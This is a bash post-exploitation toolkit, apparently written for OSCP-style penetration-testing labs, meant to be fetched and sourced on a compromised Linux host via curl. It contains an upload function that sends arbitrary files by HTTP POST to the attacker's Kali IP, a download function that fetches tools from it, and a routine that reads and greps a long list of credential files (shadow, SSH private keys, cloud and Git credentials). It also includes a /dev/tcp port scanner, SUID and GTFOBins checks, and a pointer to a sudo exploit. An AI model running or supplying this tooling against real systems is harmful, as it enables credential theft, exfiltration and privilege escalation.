#!/bin/bash
#
# . <(curl 10.10.10.10/recon.sh)
#

# Definición de colores
RESET="\e[0m"       # Resetear color
BOLD="\e[1m"        # Texto en negrita
RED="\e[1;31m"      # Rojo
GREEN="\e[1;32m"    # Verde
YELLOW="\e[1;33m"   # Amarillo
BLUE="\e[1;34m"     # Azul
CYAN="\e[1;36m"     # Cian


IP_KALI="{IP_KALI}"

#------------------------------------------------------
#  * Available functions *
#-------------------------------------------------------
function recon.help(){
    banner
    echo """
 [*] Auxiliary tools:
    - aux.upload [file]               : Send files to http server via post
    - aux.download [file]             : Perform GET to fetch files

 [*] Environment fix:
    - env.fix                       : fixes env PATH

 [*] Auxiliary recon:
    - recon.dateScan                  : Files modified between two dates
    - recon.dateLast                  : Files modified less than 15min ago
    - recon.dateSuspicious            : Suspicious timestamp binaries (IPPSEC)
    - recon.portscan <host> [1-1024]  : Perform port scanning
    - recon.pingscan 10.10.10.        : Perform /24 subnet ping scan
    - recon.pspy                      : Simple process monitor
    - recon.logs                      : Searchs for credentiales in logs

 [*] General recon:
    - recon.basic                     : Basic information
    - recon.sys                       : System information
    - recon.users                     : Local user information
    - recon.programs                  : Recent installed packages information
    - recon.process                   : Current processes information
    - recon.procmon                   : List new processes
    - recon.networks                  : Network information
    - recon.python                    : python path hijacking
    - recon.files                     : sensitive files
    - recon.mysql                     : mysql as privileged user
    - recon.exports                   : NFS privesc
    - recon.ports                     : internal ports

 [*] Privesc recon:
    - priv.setuid                     : Search for SETUID binaries
    - priv.suid                       : same as setuid but simply
    - priv.guid                       : GUID binaries
    - priv.sudo                       : sudo version
    - priv.sudoers                    : sudoers version
    - priv.capabilities               : Search for present capabilities
    - priv.writable                   : Search for manipulable locations
    - priv.search.fname               : Search files with name passwd 
    - priv.search.fcontent            : Search files with passwd content
    - priv.search.sshkeys             : Search potential ssh files
    - priv.crontabs                   : Search for crontabs
    - priv.mysql                      : MySQL Ver 14.14 running as root
    """
}

function priv.mysql {
  ps -aux | grep -i "sql"
}

#------------------------------------------
#  *   Upload files via http POST  *
#------------------------------------------
function aux.upload {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Upload file:"
		echo "        aux.upload <File>"
		return
	fi
    filename=$(basename "$1")
    wget --post-file=$1 -O /dev/null --header="Content-Disposition: attachment; filename="$filename $IP_KALI 
}

function env.fix {

  env reset
  stty onlcr
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/root/.local/bin:/usr/share:/snap/bin:/usr/sandbox:/usr/local/go/bin:/usr/share/games:/opt:/root/go/bin:/opt/bin:/opt/local/bin:/opt/tools:$HOME/bin:$HOME/.local/bin:$HOME/scripts:/var/www/html/scripts:/usr/libexec:/etc/custom/scripts:/mnt/shared/scripts
  export TERM=xterm-256color
  reset xterm


}



function recon.logs() {
    # Definir rutas comunes de logs


local log_paths=(

  "/app/etc/local.xml"
  "/etc/aliases"
  "/etc/anacrontab"
  "/etc/apache2/apache2.conf"
  "/etc/apache2/httpd.conf"
  "/etc/apache2/ports.conf"
  "/etc/apache2/sites-available/default"
  "/etc/apache2/sites-enabled/000-default.conf"
  "/etc/at.allow"
  "/etc/at.deny"
  "/etc/bashrc"
  "/etc/bootptab"
  "/etc/chrootUsers"
  "/etc/chttp.conf"
  "/etc/cron.allow"
  "/etc/cron.d/"
  "/etc/cron.deny"
  "/etc/crontab"
  "/etc/cups/cupsd.conf"
  "/etc/docker/daemon.json"
  "/etc/exports"
  "/etc/fstab"
  "/etc/ftpaccess"
  "/etc/ftpchroot"
  "/etc/ftphosts"
  "/etc/group"
  "/etc/groups"
  "/etc/grub.conf"
  "/etc/hosts"
  "/etc/hosts.allow"
  "/etc/hosts.deny"
  "/etc/httpd/access.conf"
  "/etc/httpd/conf.d"
  "/etc/httpd/conf/httpd.conf"
  "/etc/httpd/httpd.conf"
  "/etc/httpd/logs/access.log"
  "/etc/httpd/logs/access_log"
  "/etc/httpd/logs/error.log"
  "/etc/httpd/logs/error_log"
  "/etc/httpd/php.ini"
  "/etc/httpd/srm.conf"
  "/etc/inetd.conf"
  "/etc/init.d/apache2"
  "/etc/inittab"
  "/etc/issue"
  "/etc/knockd.conf"
  "/etc/ldap.conf"
  "/etc/lighttpd.conf"
  "/etc/lilo.conf"
  "/etc/logrotate.d/ftp"
  "/etc/logrotate.d/proftpd"
  "/etc/logrotate.d/vsftpd.log"
  "/etc/lsb-release"
  "/etc/modules.conf"
  "/etc/motd"
  "/etc/mtab"
  "/etc/my.cnf"
  "/etc/my.conf"
  "/etc/mysql/my.cnf"
  "/etc/network/interfaces"
  "/etc/networks"
  "/etc/nginx.conf"
  "/etc/nginx/nginx.conf"
  "/etc/nginx/sites-available/default"
  "/etc/nginx/sites-available/default.conf"
  "/etc/nginx/sites-enable/default"
  "/etc/nginx/sites-enable/default.conf"
  "/etc/npasswd"
  "/etc/passwd"
  "/etc/passwd-"
  "/etc/php.ini"
  "/etc/php/apache/php.ini"
  "/etc/php/apache2/php.ini"
  "/etc/php/cgi/php.ini"
  "/etc/php/php.ini"
  "/etc/php/php4/php.ini"
  "/etc/php4.4/fcgi/php.ini"
  "/etc/php4/apache/php.ini"
  "/etc/php4/apache2/php.ini"
  "/etc/php4/cgi/php.ini"
  "/etc/php5/apache/php.ini"
  "/etc/php5/apache2/php.ini"
  "/etc/postgresql/*/main/pg_hba.conf"
  "/etc/printcap"
  "/etc/profile"
  "/etc/proftp.conf"
  "/etc/proftpd/proftpd.conf"
  "/etc/pure-ftpd.conf"
  "/etc/pure-ftpd/pure-ftpd.conf"
  "/etc/pure-ftpd/pure-ftpd.pdb"
  "/etc/pure-ftpd/putreftpd.pdb"
  "/etc/pureftpd.passwd"
  "/etc/pureftpd.pdb"
  "/etc/redhat-release"
  "/etc/resolv.conf"
  "/etc/samba/smb.conf"
  "/etc/shadow"
  "/etc/shadow-"
  "/etc/snmpd.conf"
  "/etc/ssh/ssh_config"
  "/etc/ssh/ssh_host_dsa_key"
  "/etc/ssh/ssh_host_dsa_key.pub"
  "/etc/ssh/ssh_host_key"
  "/etc/ssh/ssh_host_key.pub"
  "/etc/ssh/ssh_host_rsa_key"
  "/etc/ssh/sshd_config"
  "/etc/ssl/private/"
  "/etc/sysconfig/network"
  "/etc/syslog.conf"
  "/etc/termcap"
  "/etc/vhcs2/proftpd/proftpd.conf"
  "/etc/vsftpd.chroot_list"
  "/etc/vsftpd.conf"
  "/etc/vsftpd/vsftpd.conf"
  "/etc/wu-ftpd/ftpaccess"
  "/etc/wu-ftpd/ftphosts"
  "/etc/wu-ftpd/ftpusers"
  "/home/*/.bash_history"
  "/home/*/.git-credentials"
  "/home/*/.mysql_history"
  "/home/*/.ssh/id_rsa"
  "/logs/pure-ftpd.log"
  "/logs/security_debug_log"
  "/logs/security_log"
  "/opt/lamp/log/access_log"
  "/opt/lamp/logs/error_log"
  "/opt/lampp/etc/httpd.conf"
  "/opt/lampp/logs/access_log"
  "/opt/lampp/logs/error_log"
  "/opt/xampp/etc/php.ini"
  "/proc/<PID>/cmdline"
  "/proc/<PID>/maps"
  "/proc/cmdline"
  "/proc/config.gz"
  "/proc/cpuinfo"
  "/proc/filesystems"
  "/proc/interrupts"
  "/proc/ioports"
  "/proc/meminfo"
  "/proc/modules"
  "/proc/mounts"
  "/proc/net/arp"
  "/proc/net/fib_trie"
  "/proc/net/route"
  "/proc/net/tcp"
  "/proc/net/udp"
  "/proc/sched_debug"
  "/proc/schedstat"
  "/proc/self/cwd/app.py"
  "/proc/self/environ"
  "/proc/self/net/arp"
  "/proc/self/sched_debug"
  "/proc/self/schedstat"
  "/proc/stat"
  "/proc/swaps"
  "/proc/version"
  "/root/.Xdefaults"
  "/root/.Xresources"
  "/root/.ansible_vault"
  "/root/.atfp_history"
  "/root/.aws/credentials"
  "/root/.azure/credentials"
  "/root/.bash_history"
  "/root/.bash_logout"
  "/root/.bash_profile"
  "/root/.bashrc"
  "/root/.cache/gcloud/logs/"
  "/root/.config/gcloud/application_default_credentials.json"
  "/root/.docker/config.json"
  "/root/.gem/credentials"
  "/root/.gtkrc"
  "/root/.kube/config"
  "/root/.login"
  "/root/.logout"
  "/root/.my.cnf"
  "/root/.mysql_history"
  "/root/.nano_history"
  "/root/.npmrc"
  "/root/.php_history"
  "/root/.pip/pip.conf"
  "/root/.profile"
  "/root/.pypirc"
  "/root/.ssh/authorized_keys"
  "/root/.ssh/id_dsa"
  "/root/.ssh/id_dsa.pub"
  "/root/.ssh/id_ecdsa"
  "/root/.ssh/id_ecdsa_sk"
  "/root/.ssh/id_ed25519"
  "/root/.ssh/id_ed25519_sk"
  "/root/.ssh/id_rsa"
  "/root/.ssh/id_rsa.keystore"
  "/root/.ssh/id_rsa.pub"
  "/root/.ssh/identity"
  "/root/.ssh/identity.pub"
  "/root/.ssh/known_hosts"
  "/root/.terraform.d/credentials.tfrc.json"
  "/root/.viminfo"
  "/root/.wm_style"
  "/root/.xinitrc"
  "/root/.xsession"
  "/root/.zsh_history"
  "/root/.zshrc"
  "/root/anaconda-ks.cfg"
  "/tmp/"
  "/usr/etc/pure-ftpd.conf"
  "/usr/lib/php.ini"
  "/usr/lib/php/php.ini"
  "/usr/local/Zend/etc/php.ini"
  "/usr/local/apache/audit_log"
  "/usr/local/apache/bin/apachectl"
  "/usr/local/apache/conf/extra/httpd-ssl.conf"
  "/usr/local/apache/conf/httpd.conf"
  "/usr/local/apache/conf/modsec.conf"
  "/usr/local/apache/conf/php.ini"
  "/usr/local/apache/error.log"
  "/usr/local/apache/error_log"
  "/usr/local/apache/htdocs/index.html"
  "/usr/local/apache/log"
  "/usr/local/apache/logs"
  "/usr/local/apache/logs/access.log"
  "/usr/local/apache/logs/access_log"
  "/usr/local/apache/logs/error_log"
  "/usr/local/apache2/bin/apachectl"
  "/usr/local/apache2/conf/extra/httpd-ssl.conf"
  "/usr/local/apache2/conf/httpd.conf"
  "/usr/local/apache2/htdocs/index.html"
  "/usr/local/apache2/logs/access_log"
  "/usr/local/apache2/logs/error_log"
  "/usr/local/cpanel/logs"
  "/usr/local/cpanel/logs/access_log"
  "/usr/local/cpanel/logs/error_log"
  "/usr/local/cpanel/logs/license_log"
  "/usr/local/cpanel/logs/login_log"
  "/usr/local/cpanel/logs/stats_log"
  "/usr/local/etc/httpd/logs/access_log"
  "/usr/local/etc/httpd/logs/error_log"
  "/usr/local/etc/nginx/nginx.conf"
  "/usr/local/etc/php.ini"
  "/usr/local/etc/pure-ftpd.conf"
  "/usr/local/etc/pureftpd.pdb"
  "/usr/local/lib/php.ini"
  "/usr/local/nginx/conf/nginx.conf"
  "/usr/local/php/httpd.conf"
  "/usr/local/php/httpd.conf.ini"
  "/usr/local/php/lib/php.ini"
  "/usr/local/php4/httpd.conf"
  "/usr/local/php4/httpd.conf.php"
  "/usr/local/php4/lib/php.ini"
  "/usr/local/php5/httpd.conf"
  "/usr/local/php5/httpd.conf.php"
  "/usr/local/php5/lib/php.ini"
  "/usr/local/pureftpd/etc/pure-ftpd.conf"
  "/usr/local/pureftpd/etc/pureftpd.pdn"
  "/usr/local/pureftpd/sbin/pure-config.pl"
  "/usr/local/www/logs/httpd_log"
  "/usr/sbin/pure-config.pl"
  "/var/adm/log/xferlog"
  "/var/apache/logs/access.log"
  "/var/apache/logs/access_log"
  "/var/apache/logs/error.log"
  "/var/apache/logs/error_log"
  "/var/apache2/config.inc"
  "/var/cpanel/cpanel.config"
  "/var/htmp"
  "/var/lib/docker/volumes/"
  "/var/lib/kubelet/config.yaml"
  "/var/lib/mysql/my.cnf"
  "/var/lib/mysql/mysql/user.MYD"
  "/var/lib/snapd/state.json"
  "/var/local/www/conf/php.ini"
  "/var/log/access_log"
  "/var/log/apache-ssl/access.log"
  "/var/log/apache-ssl/error.log"
  "/var/log/apache/access.log"
  "/var/log/apache/access_log"
  "/var/log/apache/error.log"
  "/var/log/apache/error_log"
  "/var/log/apache2/access.log"
  "/var/log/apache2/access_log"
  "/var/log/apache2/error.log"
  "/var/log/apache2/error_log"
  "/var/log/audit/audit.log"
  "/var/log/auth.log"
  "/var/log/boot"
  "/var/log/btmp"
  "/var/log/chttp.log"
  "/var/log/cloud-init-output.log"
  "/var/log/cloud-init.log"
  "/var/log/cron.log"
  "/var/log/cups/error.log"
  "/var/log/daemon.log"
  "/var/log/debug"
  "/var/log/dmesg"
  "/var/log/dmessage"
  "/var/log/dpkg.log"
  "/var/log/exim.paniclog"
  "/var/log/exim/mainlog"
  "/var/log/exim/rejectlog"
  "/var/log/exim_mainlog"
  "/var/log/exim_paniclog"
  "/var/log/exim_rejectlog"
  "/var/log/faillog"
  "/var/log/ftp-proxy"
  "/var/log/ftp-proxy/ftp-proxy.log"
  "/var/log/ftplog"
  "/var/log/httpd-access.log"
  "/var/log/httpd/access.log"
  "/var/log/httpd/access_log"
  "/var/log/httpd/error.log"
  "/var/log/httpd/error_log"
  "/var/log/httpsd/ssl.access_log"
  "/var/log/httpsd/ssl_log"
  "/var/log/journal/"
  "/var/log/kern.log"
  "/var/log/krb5kdc.log"
  "/var/log/lastlog"
  "/var/log/lighttpd/access.log"
  "/var/log/lighttpd/error.log"
  "/var/log/lighttpd/lighttpd.access.log"
  "/var/log/lighttpd/lighttpd.error.log"
  "/var/log/mail"
  "/var/log/mail.info"
  "/var/log/mail.log"
  "/var/log/mail.warn"
  "/var/log/maillog"
  "/var/log/message"
  "/var/log/messages"
  "/var/log/mysql.log"
  "/var/log/mysql/error.log"
  "/var/log/mysql/mysql-bin.log"
  "/var/log/mysql/mysql-slow.log"
  "/var/log/mysql/mysql.log"
  "/var/log/mysqlderror.log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/access_log"
  "/var/log/nginx/error.log"
  "/var/log/nginx/error_log"
  "/var/log/openvpn.log"
  "/var/log/postgresql/postgresql.log"
  "/var/log/proftpd"
  "/var/log/pure-ftpd/pure-ftpd.log"
  "/var/log/pureftpd.log"
  "/var/log/samba/log.smbd"
  "/var/log/secure"
  "/var/log/snapd.log"
  "/var/log/sshd.log"
  "/var/log/sudo.log"
  "/var/log/syslog"
  "/var/log/vsftpd.log"
  "/var/log/wtmp"
  "/var/log/xferlog"
  "/var/log/yum.log"
  "/var/mysql.log"
  "/var/run/utmp"
  "/var/spool/cron/crontabs/root"
  "/var/spool/cron/root"
  "/var/tmp/"
  "/var/webmin/miniserv.log"
  "/var/www/<vhost>/__init__.py"
  "/var/www/config.php"
  "/var/www/configuration.php"
  "/var/www/html/.env"
  "/var/www/html/.htaccess"
  "/var/www/html/config.php"
  "/var/www/html/db_connect.php"
  "/var/www/html/inc/header.inc.php"
  "/var/www/html/sites/default/settings.php"
  "/var/www/html/utils.php"
  "/var/www/html/wp-config.php"
  "/var/www/html<VHOST>/__init__.py"
  "/var/www/log/access_log"
  "/var/www/log/error_log"
  "/var/www/logs/access.log"
  "/var/www/logs/access_log"
  "/var/www/logs/error.log"
  "/var/www/logs/error_log"

	

)



    # Comando grep para buscar palabras clave relacionadas con credenciales
    local search_pattern='(password|username|user|pass|key|token|secret|admin|administrator|cred|login|credentials)'


    echo -e "${BLUE}[INFO]${RESET} Buscando posibles credenciales en logs..."
    for log in "${log_paths[@]}"; do
        if [[ -f "$log" ]]; then
            printf "${GREEN}[✔]${RESET} Procesando archivo: ${CYAN}%s${RESET}\n" "$log"
            results=$(grep -rinE --color=always "$search_pattern" "$log")
            if [[ -n "$results" ]]; then
                printf "${YELLOW}[!]${RESET} Resultados encontrados en: ${CYAN}%s${RESET}\n" "$log"
                echo -e "$results" | sed -E "s/($search_pattern)/$(printf "${RED}")\1$(printf "${RESET}")/g" | \
                    awk '{print "  ➤ " $0}'
            else
                printf "${GREEN}[✔]${RESET} Sin coincidencias en: ${CYAN}%s${RESET}\n" "$log"
            fi
        else
            printf "${RED}[✘]${RESET} Archivo no encontrado: ${CYAN}%s${RESET}\n" "$log"
        fi
    done

}


#------------------------------------------
#  * Download files via http POST *
#------------------------------------------
function aux.download {
	if [[ $# -ne 1  ]]; then
		echo ""
		echo " [>] Download file:"
		echo "        aux.download <File>"
		return
	fi
	wget "$IP_KALI/$1"
}


#------------------------------------------
#  * Search files modified 15 minutes ago *
#------------------------------------------
function recon.dateLast(){
	find / -type f -mmin -15 -exec ls -la {} \; 2>/dev/null | grep -v proc
}

function recon.ports(){
	netstat -nat
}


function recon.basic(){
  echo "PATH"
  echo $PATH
  echo "\n"
  echo "groups"
	id
  echo "\n"
  echo "bash version"
  /bin/bash --version
  echo "Bash versions <4.2-048 vulnerable"
  echo "\n"
  echo "kernel version"
  uname -r
  echo "linux kernel under 5.8 -> dirty pipe"
  echo "2.6.22 < 3.9 -> dirty cow"
  
}

function priv.sudoers()
{
  sudo -l
}

function recon.files(){
  ls -l  /etc/shadow
  echo "writable or readable shadow = vulnerable"
  ls -l /etc/passwd
  echo "writable passwd = vulnerable"
  ls -l /etc/sudoers
  echo "writable sudoers = vulnerable"
}

function recon.exports(){
  cat /etc/exports
  echo "NFS priv esc"
}

function recon.mysql ()
{
  ps -aux | grep mysql
  echo "mysql running as privileged user like root"
}

function recon.python() {
    # Busca ejecutables de Python en el PATH
    found=false
    for python in $(compgen -c | grep -E '^python[0-9\.]*$' | sort -u); do
        # Comprueba si el comando se puede ejecutar
        if command -v "$python" > /dev/null 2>&1; then
            echo -ne "\nFound Python: $python"
            "$python" -c 'import sys; print(sys.path)'
            found=true
        fi
    done

    if [ "$found" = false ]; then
        echo "No Python version found."
        return 1
    fi

    return 0
}




#------------------------------------------
#  * Search files between two dates *
#------------------------------------------
function recon.dateScan(){
	if [[ $# -ne 2  ]]; then
		echo ""
		echo " [>] Report between two dates:"
		echo "        dan.dateScan 2020-01-01 2020-02-01"
		return
	fi

	dat1=$1
	dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")

	while [[ "$dat1" < "$2" ]];do
		echo ""
		echo "------------------------------------------------"
		echo -e "\e[102m            $dat1 <-> $dat2           \e[0m"
		echo "------------------------------------------------"

		find / -type f -newermt $dat1 ! -newermt $dat2 -exec ls -la {} \; 2>/dev/null

		#Add one more day
		dat1=$dat2
		dat2=$(date --date="$dat1 + 1 day" +"%Y-%m-%d")
	done
}


#------------------------------------------
#  * Executables with suspicious date *
#------------------------------------------
function recon.dateSuspicious(){
	for i in $(echo $PATH | tr ":" "\\n"); do ls -la --time-style=full $i | grep -v "000000\\|->";done
}


#------------------------------------------
#  * Port Scanner *
#------------------------------------------
function recon.portscan() {
    local ip=$1
    local port_range=${2:-"1-1024"}

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Port Scanner:"
        echo "        recon.portscan <host> [1-1024]"
        return
    fi

    IFS='-' read -r start_port end_port <<< "$port_range"

    for port in $(seq "$start_port" "$end_port"); do
        (echo >/dev/tcp/$ip/$port) &>/dev/null && echo "     [>] Port $port is open!"
    done
}


#------------------------------------------
#  * Ping Scan /24 subnet *
#------------------------------------------
function recon.pingscan() {
    local ip=$1

    # Verify that host is provided
    if [ -z "$ip" ]; then
        echo ""
        echo " [>] Net Ping Scan:"
        echo "        recon_pingscan 192.168.0."
        return
    fi

    for i in {1..225}; do
        current_ip="$ip$i"
        if ping -c 1 -W 1 "$current_ip" &>/dev/null; then
            echo "$current_ip: Responding"
        fi
    done
}


#------------------------------------------
#  System Information
#------------------------------------------
function recon.sys {
	echo ""
    echo " [*] System Information:"
	echo " -------------------------------------"
	echo " Hostname: $(hostname)"
	echo " Kernel: $(uname -a)"
	echo " Uptime: $(uptime -p)"
	echo ""
	echo " [*] CPU Information:"
	echo " -------------------------------------"
	echo " CPU Model: $(grep "model name" /proc/cpuinfo | head -n1 | cut -d':' -f2 | tr -s ' ')"
	echo " CPU Cores: $(grep "^processor" /proc/cpuinfo | wc -l)"
	echo ""
	echo " [*] Memory Information:"
	echo " -------------------------------------"
	echo " Total Memory: $(free -h | awk '/^Mem:/ {print $2}')"
	echo " Used Memory:  $(free -h | awk '/^Mem:/ {print $3}')"
	echo ""
	echo " [*] Disk Information:"
	echo " -------------------------------------"
	df -h | awk '$NF=="/" {print " Root Disk: Total=" $2 ", Used=" $3 ", Free=" $4}'
	echo ""
	echo " GPU Information:"
	echo " -------------------------------------"
	echo " $(lspci | grep -i "vga\|3d")"
	echo ""
}


#------------------------------------------
#  Information about system users and groups
#------------------------------------------
function recon.users {
	echo ""
    echo " ##############################################################"
    echo "                   Active System Users"
    echo " ##############################################################"

    grep "sh" /etc/passwd 
	while IFS=: read -r username _ uid _ _ hom term; do
    if [ "$uid" -ge 1000 ] && [ "$uid" -ne 65534 ]; then
        echo "   [>] $username \tHome: $hom \tTerm: $term"
        echo "         Groups:"
        echo -n "       " ;groups $username | cut -d ' ' -f3- | xargs -n1 echo -n " "
        echo ""
    fi
	done < /etc/passwd
}


#------------------------------------------
#  Recently Installed Packages
#------------------------------------------
function recon.programs {
	echo ""
    echo " ##############################################################"
    echo "        Last 100 Installed Packages on the System"
    echo " ##############################################################"
	echo ""
    grep " install " /var/log/dpkg.log* | sed 's/^[^:]*://g' | sort | tail -n100
    echo ""
}


#------------------------------------------
#  System Process Information
#------------------------------------------
function recon.process {
	echo ""
	ps auxf | grep -vE "\[.*\]" | cut -c 1-$(tput cols)
	echo ""
}

function recon.procmon {
	echo ""
	
  old_process=$(ps -eo command)

  while true; do
      new_process=$(ps -eo command)
      diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command|kworker"
      old_process=$new_process
  done

	echo ""
}


#------------------------------------------
#  Network Information
#------------------------------------------
function recon.networks {
	echo ""
    echo "##############################################################"
    echo "                Open Ports on the Machine"
    echo "##############################################################"
	ss -tupln
	echo ""
    echo "##############################################################"
    echo "                     Network Interfaces"
    echo "##############################################################"
    ip addr
	echo ""
    echo "##############################################################"
    echo "                       Routing Table"
    echo "##############################################################"
    route
}


#------------------------------------------
#  pspy-like Auxiliary Program
#------------------------------------------
function recon.pspy() {
	echo ""
    echo "##############################################################"
    echo "         Monitoring New Processes on the Machine"
    echo "##############################################################"
    while true; do
        processes=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        sleep 0.2
        processes2=$(ps -eo command --sort=start_time | grep -vE "\[.*\]" | grep -v tail | tail -n +2)
        diff <(echo "$processes") <(echo "$processes2") | grep "^>"
    done
}



function priv.sudo {

  echo ""
    echo "##############################################################"
    echo "                      SETUID Programs"
    echo "##############################################################"
  sudo --version
  echo "versiones 1.8.2, 1.8.31p2 y todas las versiones estables de la 1.9.0 a la 1.9.5p1"
  echo "https://github.com/teamtopkarl/CVE-2021-3156/tree/main"


}

#------------------------------------------
#  SETUID Programs
#------------------------------------------
function priv.setuid {
	#Programs from GFOBins
	keywords=("aa-exec" "ab" "agetty" "alpine" "ar" "arj" "arp" "as" "ascii-xfr" "ash" "aspell" "atobm" "awk"
          "base32" "base64" "basenc" "basez" "bash" "bc" "bridge" "busybox" "bzip2" "cabal" "capsh" "cat"
          "chmod" "choom" "chown" "chroot" "clamscan" "cmp" "column" "comm" "cp" "cpio" "cpulimit" "csh"
          "csplit" "csvtool" "cupsfilter" "curl" "cut" "dash" "date" "dd" "debugfs" "dialog" "diff" "dig"
          "distcc" "dmsetup" "docker" "dosbox" "ed" "efax" "elvish" "emacs" "env" "eqn" "espeak" "expand"
          "expect" "file" "find" "fish" "flock" "fmt" "fold" "gawk" "gcore" "gdb" "genie" "genisoimage"
          "gimp" "grep" "gtester" "gzip" "hd" "head" "hexdump" "highlight" "hping3" "iconv" "install"
          "ionice" "ip" "ispell" "jjs" "join" "jq" "jrunscript" "julia" "ksh" "ksshell" "kubectl" "ld.so"
          "less" "logsave" "look" "lua" "make" "mawk" "minicom" "more" "mosquitto" "msgattrib" "msgcat"
          "msgconv" "msgfilter" "msgmerge" "msguniq" "multitime" "mv" "nasm" "nawk" "ncftp" "nft" "nice"
          "nl" "nm" "nmap" "node" "nohup" "od" "openssl" "openvpn" "pandoc" "paste" "perf" "perl" "pexec"
          "pg" "php" "pidstat" "pr" "ptx" "python" "rc" "readelf" "restic" "rev" "rlwrap" "rsync" "rtorrent"
          "run-parts" "rview" "rvim" "sash" "scanmem" "sed" "setarch" "setfacl" "setlock" "shuf" "soelim"
          "softlimit" "sort" "sqlite3" "ss" "ssh-agent" "ssh-keygen" "ssh-keyscan" "sshpass"
          "start-stop-daemon" "stdbuf" "strace" "strings" "sysctl" "systemctl" "tac" "tail" "taskset"
          "tbl" "tclsh" "tee" "terraform" "tftp" "tic" "time" "timeout" "troff" "ul" "unexpand" "uniq"
          "unshare" "unsquashfs" "unzip" "update-alternatives" "uudecode" "uuencode" "vagrant" "view"
          "vigr" "vim" "vimdiff" "vipw" "w3m" "watch" "wc" "wget" "whiptail" "xargs" "xdotool" "xmodmap"
          "xmore" "xxd" "xz" "yash" "zsh" "zsoelim")
	echo ""
    echo "##############################################################"
    echo "                      SETUID Programs"
    echo "##############################################################"
    setuids=$(find / -perm -4000 -type f ! -path "/dev/*" -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}')
	echo "$setuids" | while IFS= read -r line; do
	binary_name=$(echo "$line" | awk '{print $NF}' | xargs basename)
	out="$line"
	for keyword in "${keywords[@]}"; do
	  if [[ "$binary_name" == "$keyword" ]]; then
	    out="\033[1;31m$line\033[0m"
	    break
	  fi
	done
	echo -e "$out"
	done
	}

function priv.suid {
  find / -perm -4000 -exec ls -l {} \; 2> /dev/null
}

function priv.guid {
  find / -perm -2000 -exec ls -l {} \; 2> /dev/null
}

#------------------------------------------
#      Programs with Capabilities
#------------------------------------------
function priv.capabilities {
	echo ""
    echo "##############################################################"
    echo "                Programs with Capabilities"
    echo "##############################################################"
	/usr/sbin/getcap -r / 2>/dev/null
}


#------------------------------------------
#  User-Writable Directories
#------------------------------------------
function priv.writable {
	echo ""
    echo "##############################################################"
    echo "                 User-Writable Locations"
    echo "##############################################################"
	find / -writable ! -path "/proc/*" ! -path "/dev/*" ! -path "/run/*" ! -path "/sys/*" -exec ls -adl {} \; 2>/dev/null
}


#------------------------------------------
#  Files by Password-Like Name
#------------------------------------------
function priv.search.fname {
	echo ""
    echo "##############################################################"
    echo "               Files with 'passw' or 'config' on name from current directory"
    echo "##############################################################"
    find . -type f \( -name "*config*" -o -name "*passw*" \)  -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n | awk '{$1=""; print $0}'
}


#------------------------------------------
#  Files that May Contain Passwords
#------------------------------------------
function priv.search.fcontent {
	echo ""
    echo "##############################################################"
    echo "             Files Containing 'passw' word"
    echo "##############################################################"
    find . -type f \( -name "*.dll" -o -name "*.so" -o -name "*.js" \) -prune -o -exec grep -i -l "passw" {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  Potential SSH Key Files
#------------------------------------------
function priv.search.sshkeys {
    echo ""
    echo "##############################################################"
    echo "                       SSH Key Files"
    echo "##############################################################"
    find . -type f -exec grep -l '^-----BEGIN \(RSA\|DSA\|EC\|OPENSSH\) PRIVATE KEY-----' {} \; 2>/dev/null | xargs ls -lt --time=at
}


#------------------------------------------
#  System Crontabs
#------------------------------------------
function priv.crontabs {
	echo ""
    echo "##############################################################"
    echo "              Scheduled Tasks on the System"
    echo "##############################################################"
    find /etc/cron* -type f -not -name "*.placeholder" -exec bash -c "echo;echo;echo ---------------------------------;echo {};echo ---------------------------------;cat {}" \;
	echo ""
    echo "##############################################################"
    echo "                Scheduled Tasks in General"
    echo "##############################################################"
    cat /etc/crontab
	echo ""
    echo "##############################################################"
    echo "          Search in syslog for Scheduled Tasks"
    echo "##############################################################"
    grep "CRON" /var/log/syslog 2>/dev/null | tail -n 50
}


#------------------------------------------
#  Additional Function to Display Banner
#------------------------------------------
function banner {
	echo "

     ___  __    ___   ___                            
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __  
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \  
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|
                                                     
 ========================================================
                                             DannyDB@~>
 "
}


#------------------------------------------
#  Additional Function to Execute Tree
#------------------------------------------
function tree {
    local directory=./
    echo ""
    echo "Directories: $directory"
    echo "----------------------------------"
    find "$directory" -type f | sed -e "s;^$directory;/;" | awk -F'/' '{for (i=2;i<NF;i++) printf "  "; print "|--", $NF}'
    echo ""
}

check_ip_kali() {
    if [[ "$IP_KALI" =~ "IP_KALI" ]]; then
        clear
        echo ""
        echo -n " [>] Please enter the IP address for Kali: "
        read IP_KALI
        export IP_KALI
        echo ""
    fi
}


#------------------------------------------
#  Some Aliases
#------------------------------------------
alias ll='ls -lh --group-dirs=first --color=auto'



check_ip_kali
recon.help
